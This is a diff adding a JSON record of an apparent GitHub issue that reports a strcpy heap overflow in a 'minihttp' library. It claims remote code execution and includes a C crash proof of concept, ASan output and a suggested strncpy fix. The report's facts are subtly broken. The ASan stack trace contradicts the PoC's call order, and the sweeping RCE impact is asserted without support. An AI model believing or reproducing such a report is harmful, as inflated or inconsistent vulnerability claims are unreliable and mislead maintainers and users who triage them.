@@ -1,0 +1,10 @@
+{
+  "kind": "issue",
+  "repo": "example/minihttp",
+  "number": 101,
+  "url": "https://github.com/example/minihttp/issues/101",
+  "title": "Heap buffer overflow in mh_easy_setopt_url_safe() leads to RCE",
+  "body": "## Summary\nA heap buffer overflow in `mh_easy_setopt_url_safe()` lets a remote attacker execute arbitrary code by supplying a long URL.\n\n## Details\nIn `lib/easy.c` line 412, the function `mh_easy_setopt_url_safe()` copies the user-supplied URL into a fixed 256-byte buffer with `strcpy()` without checking its length. Because the URL can come from an HTTP redirect, a malicious server controls it, which makes this remotely exploitable (CWE-122).\n\nThe same unchecked copy also exists in `lib/vtls/openssl_ext.c`, which is called from `mh_easy_perform()`.\n\n## Proof of concept\n```c\n#include <minihttp.h>\nint main(void) {\n  char url[4096];\n  memset(url, 'A', sizeof(url) - 1);\n  url[sizeof(url) - 1] = 0;\n  mh_easy *h = mh_easy_init();\n  mh_easy_setopt_url_safe(h, url);\n  return mh_easy_perform(h);\n}\n```\n\n## ASan output\n```\n==48213==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000110\nWRITE of size 4096 at 0x602000000110 thread T0\n    #0 0x4f2a1b in mh_easy_setopt_url_safe lib/easy.c:412:5\n    #1 0x4f3c22 in mh_easy_perform lib/easy.c:530:12\n    #2 0x4f1d10 in main poc.c:7:3\n```\n\n## Impact\nRemote code execution in every application that uses minihttp 2.4.1.\n\n## Fix\nReplace `strcpy()` with `strncpy()` in `mh_easy_setopt_url_safe()`.\n",
+  "author": "reporter",
+  "created_at": "2026-10-30T12:00:00Z"
+}
